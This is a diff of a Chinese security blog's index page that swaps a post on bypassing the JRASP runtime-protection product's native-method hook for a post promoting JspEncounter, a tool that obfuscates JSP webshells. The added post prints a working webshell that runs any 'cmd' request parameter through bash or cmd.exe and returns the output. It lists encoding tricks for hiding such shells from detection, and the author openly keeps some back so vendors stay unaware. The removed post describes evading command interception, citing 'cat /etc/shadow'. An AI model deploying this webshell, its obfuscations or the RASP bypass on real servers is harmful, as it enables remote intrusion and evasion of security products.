@@ -152,62 +152,67 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-Native-Method-Hook-Bypass" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-JSP下的白魔法" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/10/01/Native-Method-Hook-Bypass/">Native-Method-Hook-Bypass</a>
+      <a class="article-title" href="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/">JSP下的白魔法</a>
     </h1>
   
 
         
-        <a href="/2022/10/01/Native-Method-Hook-Bypass/" class="archive-article-date">
-  	<time datetime="2022-10-02T04:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-10-01</time>
+        <a href="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/" class="archive-article-date">
+  	<time datetime="2022-11-29T08:41:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-11-29</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="JRASP-Native-Method-Hook-Bypass"><a href="#JRASP-Native-Method-Hook-Bypass" class="headerlink" title="JRASP Native Method Hook Bypass"></a>JRASP Native Method Hook Bypass</h1><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>事情的开头是这样的，在21年年末，笔者与另外一些人，几乎同一时间发表了 java rasp的一个hook点bypass手法：利用 unsafe 在不调用类实例化方法的情况下我们可以直接获得一个class的实例化对象，随后调用其底层的native方法，从而进行命令执行等操作，由于native方法没有方法体无法被hook，当时的RASP都没有处理这种问题。</p>
-<p>JRASP是某公司推出的RASP产品，使用了 “native method hook” 技术，可对抗这种 rasp bypass 手法，该技术方案在今年的KCON上也有提到。本文阐述绕过该产品的 native method hook。</p>
-<p><img src="/2022/10/01/Native-Method-Hook-Bypass/jrasp_1.png" alt="jrasp_1"></p>
-<h2 id="安装JRASP"><a href="#安装JRASP" class="headerlink" title="安装JRASP"></a>安装JRASP</h2><p>在linux下安装JRASP，且提前安装好maven zip</p>
-<p>JRASP安装过程可参考 <a href="https://github.com/jvm-rasp/jrasp-agent" target="_blank" rel="noopener">https://github.com/jvm-rasp/jrasp-agent</a></p>
-<p> <img src="/2022/10/01/Native-Method-Hook-Bypass/jrasp_install.png" alt="jrasp_install"></p>
-<p>由于插件项目依赖jrasp-agent项目，在编译插件前需要在jrasp-agent下执行mvn install，添加本地依赖。</p>
-<p>下载插件项目 <a href="https://github.com/jvm-rasp/jrasp-modules，编译完成后将" target="_blank" rel="noopener">https://github.com/jvm-rasp/jrasp-modules，编译完成后将</a> deploy/* 下的jar包拷贝到 jrasp-agent/required-module ，注意修改pom.xml中的jrasp-module为1.0.4 ：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.jrasp.module<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jrasp-module<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">packaging</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br></pre></td></tr></table></figure>
+        <h1 id="JSP下的白魔法：JspEncounter"><a href="#JSP下的白魔法：JspEncounter" class="headerlink" title="JSP下的白魔法：JspEncounter"></a>JSP下的白魔法：JspEncounter</h1><p>@turn1tup</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        这几天看到以前整活的一些有趣的JSP编码手法被补天的分享会提及到，想到有大佬与前些年的笔者一样，发现了这个手法，然后也一样不吝啬分享出来，不免与有荣焉。</p>
+<p>​        竟然如此，笔者索性抽出咸鱼时间编写了一个小工具，帮助广大同学们学习该手法，而对应的原理实在枯燥乏味，就算笔者了然，但这最好还是给有心之人可自行查看吧，本文爽就完事了。</p>
+<p>​        接下来直接阐述工具相应的矩阵手法及使用效果，而工具使用的注意项及等信息则请在github查看 ：</p>
+<p>​        <a href="https://github.com/turn1tup/JspEncounter" target="_blank" rel="noopener">https://github.com/turn1tup/JspEncounter</a></p>
+<h2 id="矩阵手法"><a href="#矩阵手法" class="headerlink" title="矩阵手法"></a>矩阵手法</h2><p>被工具转换前的原始source.jsp文件内容为：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.util.*,java.io.*"</span> contentType=<span class="string">"text/html"</span> %&gt;</span><br><span class="line">&lt;%! <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;&#125; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (request.getParameter (<span class="string">"cmd"</span>) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">boolean</span> isWin = System.getProperty(<span class="string">"os.name"</span>).toUpperCase().contains(<span class="string">"WIN"</span>);</span><br><span class="line">        String[] cmd = &#123;isWin?<span class="string">"cmd"</span>:<span class="string">"/bin/bash"</span>,isWin?<span class="string">"/c"</span>:<span class="string">"-c"</span>,request.getParameter(<span class="string">"cmd"</span>)&#125;;</span><br><span class="line">        InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">        OutputStream outputStream = response.getOutputStream();</span><br><span class="line">        <span class="keyword">int</span> a;</span><br><span class="line">        outputStream.write(String.valueOf(System.currentTimeMillis()).getBytes());</span><br><span class="line">        <span class="keyword">while</span>((a=inputStream.read())!=-<span class="number">1</span>)&#123;</span><br><span class="line">            outputStream.write(a);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>工具命令为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java  &quot;-Dfile.encoding&#x3D;utf-8&quot; -jar JspEncounter.jar -m jsp -c matrix.xlsx -s source.jsp -o result.jsp</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="原理描述"><a href="#原理描述" class="headerlink" title="原理描述"></a>原理描述</h2><p>实现native method hook可参考jrasp中的文档 <a href="https://www.jrasp.com/guide/technology/native_method.html" target="_blank" rel="noopener">https://www.jrasp.com/guide/technology/native_method.html</a> 。</p>
-<p>JDK的Instrumentation源码中，该方法的英文注释阐述了这么一个机制：JDK&gt;=1.6情况下，JVM在查找一个native方法对应的C代码映射方法时，为 <code>native boolean foo(int x);</code> -&gt;<code>Java_somePackage_someClass_foo(JNIEnv* env, jint x)</code> ；而如果我们通过 setNativeMethodPrefix  对一个native 方法进行了重命名(设置了prefix) ，jvm后续在执行该 prefix native method时，即进行  <code>native boolean prefixfoo(int x);</code> -&gt;<code>Java_somePackage_someClass_prefixfoo(JNIEnv* env, jint x)</code> 映射解析 是会失败的，但其随后会去除本Instrumentation中的prefix，然后重新尝试 ，即  <code>native boolean prefixfoo(int x);</code> -&gt;<code>Java_somePackage_someClass_foo(JNIEnv* env, jint x)</code> 。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Instrumentation</span> </span>&#123;  </span><br><span class="line">    ... ...</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">setNativeMethodPrefix</span><span class="params">(ClassFileTransformer transformer, String prefix)</span></span>;</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>通过这种动态的native方法映射，JDK 解决了 native 方法无法被hook的问题，即有如下源码：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">UNIXProcess</span> <span class="keyword">extends</span> <span class="title">Process</span> </span>&#123;</span><br><span class="line">    ... ...</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">forkAndExec</span><span class="params">(<span class="keyword">int</span> paramInt1, <span class="keyword">byte</span>[] paramArrayOfbyte1, <span class="keyword">byte</span>[] paramArrayOfbyte2, <span class="keyword">byte</span>[] paramArrayOfbyte3, <span class="keyword">int</span> paramInt2, <span class="keyword">byte</span>[] paramArrayOfbyte4, <span class="keyword">int</span> paramInt3, <span class="keyword">byte</span>[] paramArrayOfbyte5, <span class="keyword">int</span>[] paramArrayOfint, <span class="keyword">boolean</span> paramBoolean)</span></span>;</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>我们在ClassFileTransformer中调用setNativeMethodPrefix设置了prefix后，可将代码修改如下：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">UNIXProcess</span> <span class="keyword">extends</span> <span class="title">Process</span> </span>&#123;</span><br><span class="line">    ... ...</span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">forkAndExec</span><span class="params">(<span class="keyword">int</span> paramInt1, <span class="keyword">byte</span>[] paramArrayOfbyte1, <span class="keyword">byte</span>[] paramArrayOfbyte2, <span class="keyword">byte</span>[] paramArrayOfbyte3, <span class="keyword">int</span> paramInt2, <span class="keyword">byte</span>[] paramArrayOfbyte4, <span class="keyword">int</span> paramInt3, <span class="keyword">byte</span>[] paramArrayOfbyte5, <span class="keyword">int</span>[] paramArrayOfint, <span class="keyword">boolean</span> paramBoolean)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> RASPforkAndExec(paramInt1, paramArrayOfbyte1, paramArrayOfbyte2, paramArrayOfbyte3, paramInt2, paramArrayOfbyte4, paramInt3, paramArrayOfbyte5, paramArrayOfint, paramBoolean);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">RASPforkAndExec</span><span class="params">(<span class="keyword">int</span> paramInt1, <span class="keyword">byte</span>[] paramArrayOfbyte1, <span class="keyword">byte</span>[] paramArrayOfbyte2, <span class="keyword">byte</span>[] paramArrayOfbyte3, <span class="keyword">int</span> paramInt2, <span class="keyword">byte</span>[] paramArrayOfbyte4, <span class="keyword">int</span> paramInt3, <span class="keyword">byte</span>[] paramArrayOfbyte5, <span class="keyword">int</span>[] paramArrayOfint, <span class="keyword">boolean</span> paramBoolean)</span></span>;</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>如此一来 <code>forkAndExec</code> 已经不是 native 方法，我们可以hook它；但如果攻击者换成调用 <code>RASPforkAndExec</code> ，则依然可以绕过我们的 hook 检测。</p>
-<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><a href="https://github.com/turn1tup/JvmRaspBypass" target="_blank" rel="noopener">https://github.com/turn1tup/JvmRaspBypass</a></p>
-<p>下载该maven项目并编译打包，之后在linux下运行（JDK8）：</p>
-<p>  <img src="/2022/10/01/Native-Method-Hook-Bypass/jrasp_2.png" alt="jrasp_2"></p>
-<p>bypass原理为找到修改后的native方法。这里的cmd1后面会被jrasp拦截，cmd2则不会被拦截。</p>
-<p><a href="https://github.com/turn1tup/JvmRaspBypass/blob/main/src/main/java/com/test/RaspExample.java" target="_blank" rel="noopener">https://github.com/turn1tup/JvmRaspBypass/blob/main/src/main/java/com/test/RaspExample.java</a></p>
-<p> <img src="/2022/10/01/Native-Method-Hook-Bypass/jrasp_3.png" alt="jrasp_3"></p>
-<p>attach注入jrasp：</p>
-<p> <img src="/2022/10/01/Native-Method-Hook-Bypass/jrasp_4.png" alt="jrasp_3"></p>
-<p>jrasp默认拦截cat /etc/shadow</p>
-<p><a href="https://github.com/jvm-rasp/jrasp-modules/blob/master/rce/rce-algorithm/src/main/java/com/jrasp/module/rcenative/algorithm/check/impl/RceCommonCheck.java" target="_blank" rel="noopener">https://github.com/jvm-rasp/jrasp-modules/blob/master/rce/rce-algorithm/src/main/java/com/jrasp/module/rcenative/algorithm/check/impl/RceCommonCheck.java</a></p>
-<p> <img src="/2022/10/01/Native-Method-Hook-Bypass/jrasp_5.png" alt="jrasp_5"></p>
-<p>我们在注入jrasp成功后 rm -rf /tmp/shadow*，随后等待一段时间，可以发现cmd2执行成功（创建了/tmp/shadow2），无拦截日志；cmd1被jrasp拦截，且有拦截日志。</p>
-<p><img src="/2022/10/01/Native-Method-Hook-Bypass/jrasp_6.png" alt="jrasp_6"></p>
+<h3 id="magic-charset"><a href="#magic-charset" class="headerlink" title="magic charset"></a>magic charset</h3><p>我们打开 <code>matrix.xlsx</code>进行配置，这里配置输出单种字符集文件：</p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/magic_charset.png" alt="all_cp037"></p>
+<p>执行命令后，输出的编码后的文件:</p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/magic_charset_demo.png" alt="magic_charset_demo"></p>
+<h3 id="declare-charset"><a href="#declare-charset" class="headerlink" title="declare charset"></a>declare charset</h3><p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/declare_charset.png" alt="declare_charset"></p>
+<p>demo（放前后都可）:</p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/declare_charset_demo.png" alt="declare_charset_demo"></p>
+<h3 id="double-chraset"><a href="#double-chraset" class="headerlink" title="double chraset"></a>double chraset</h3><p>双重字符集，这里以前文UTF-16BE 后文CP037为例：</p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/double_charset.png" alt="double_charset"></p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/double_charset_demo.png" alt="double_charset_demo"></p>
+<h3 id="controller-space"><a href="#controller-space" class="headerlink" title="controller space"></a>controller space</h3><p>xml 1.1版本下，将标签内的左右括号进行对应的字符替换，该模式目前支持的字符集为utf-8/iso-8859-1/utf-16：</p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/controller_space.png" alt="controller_space"></p>
+<p>UTF-8字符集情况下：</p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/controller_space_demo.png" alt="controller_space_demo"></p>
+<p>ISO-8859-1情况下的特殊空白字符：</p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/controller_space_demo2.png" alt="controller_space_demo"></p>
+<h3 id="unicode-amp-entity"><a href="#unicode-amp-entity" class="headerlink" title="unicode &amp; entity"></a>unicode &amp; entity</h3><p>这里使用双重编码对标签内的代码进行编码，即使用 unicode + html entity：</p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/entity.png" alt="entity"></p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/eneity_demo.png" alt="eneity_demo"></p>
+<h3 id="ext-tags"><a href="#ext-tags" class="headerlink" title="ext tags"></a>ext tags</h3><p>将代码拼接到 setProperty/useBean标签的属性中 ，该手法参考补天会议：</p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/exttag.png" alt="exttag"></p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/exttag_demo.png" alt="exttag_demo"></p>
+<h3 id="namespace"><a href="#namespace" class="headerlink" title="namespace"></a>namespace</h3><p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/namespace.png" alt="namespace"></p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/namespace_demo.png" alt="namespace"></p>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>​        通过本工具我们可以便捷地了解JSP中的这些编码手法，各手法的组合需要他们的逻辑不冲突，而某些手法组合的代码实现比较麻烦，笔者就暂先没有整，大家可自行探索。当然，笔者也稍微藏了一手，毕竟如果厂商都明白了，那我们实战起来也就不那么痛快了，但如果你能真正弄懂这个矩阵中的手法，相信也能发现其他手法。而相对整个webshell的混淆知识的图谱来说，本文也只是一角。</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.anquanke.com/post/id/210630" target="_blank" rel="noopener">https://www.anquanke.com/post/id/210630</a></p>
+<p><a href="https://www.anquanke.com/post/id/209826" target="_blank" rel="noopener">https://www.anquanke.com/post/id/209826</a></p>
+<p><code>extTag setProperty/useBean拼接代码手法</code> 参考补天2022 webshell黑魔法</p>
 
       
 
@@ -220,7 +225,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2022/10/01/Native-Method-Hook-Bypass/">展开全文 >></a>
+          <a class="article-more-a" href="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/">展开全文 >></a>
         </p>
       
 
@@ -252,7 +257,7 @@
   
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/7/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><a class="page-number" href="/page/10/">10</a><span class="space">&hellip;</span><a class="page-number" href="/page/32/">32</a><a class="extend next" rel="next" href="/page/9/">Next &amp;raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/7/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><a class="page-number" href="/page/10/">10</a><span class="space">&hellip;</span><a class="page-number" href="/page/33/">33</a><a class="extend next" rel="next" href="/page/9/">Next &amp;raquo;</a>
     </nav>
   
 
